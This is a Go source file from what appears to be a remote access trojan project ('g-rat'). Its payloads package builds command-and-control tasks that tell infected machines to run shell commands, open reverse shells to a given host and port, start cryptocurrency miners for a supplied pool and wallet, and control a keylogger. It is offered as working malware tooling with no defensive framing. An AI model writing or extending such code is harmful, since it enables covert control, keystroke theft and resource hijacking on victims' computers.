package payloads

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"time"
	
	"github.com/sevil11/g-rat/shared"
)

// PayloadType defines the type of payload
type PayloadType string

const (
	PayloadShell         PayloadType = "shell"
	PayloadPython        PayloadType = "python"
	PayloadReverseShell  PayloadType = "reverse_shell"
	PayloadMiner         PayloadType = "miner"
	PayloadKeylogger     PayloadType = "keylogger"
)

// GeneratePayload creates a new task payload
func GeneratePayload() shared.Task {
	// In a real implementation, this would select from a queue of pending tasks
	// For demonstration, just return a basic task
	return shared.Task{
		ID:      generateTaskID(),
		Type:    string(PayloadShell),
		Command: "whoami",
		CreateTime: time.Now(),
	}
}

// GenerateReverseShellPayload creates a reverse shell payload
func GenerateReverseShellPayload(host string, port int) shared.Task {
	return shared.Task{
		ID:      generateTaskID(),
		Type:    string(PayloadReverseShell),
		Command: "connect",
		Args: map[string]string{
			"host": host,
			"port": fmt.Sprintf("%d", port),
		},
		CreateTime: time.Now(),
	}
}

// GenerateMinerPayload creates a cryptocurrency miner payload
func GenerateMinerPayload(poolUrl, wallet string) shared.Task {
	return shared.Task{
		ID:      generateTaskID(),
		Type:    string(PayloadMiner),
		Command: "start",
		Args: map[string]string{
			"pool":   poolUrl,
			"wallet": wallet,
			"threads": "2", // Default to 2 threads
		},
		CreateTime: time.Now(),
	}
}

// GenerateKeyloggerPayload creates a keylogger payload
func GenerateKeyloggerPayload(action string) shared.Task {
	return shared.Task{
		ID:      generateTaskID(),
		Type:    string(PayloadKeylogger),
		Command: action,
		CreateTime: time.Now(),
	}
}

// generateTaskID creates a unique ID for a task
func generateTaskID() string {
	bytes := make([]byte, 8)
	_, err := rand.Read(bytes)
	if err != nil {
		return fmt.Sprintf("task-%d", time.Now().UnixNano())
	}
	return fmt.Sprintf("task-%s", hex.EncodeToString(bytes))
}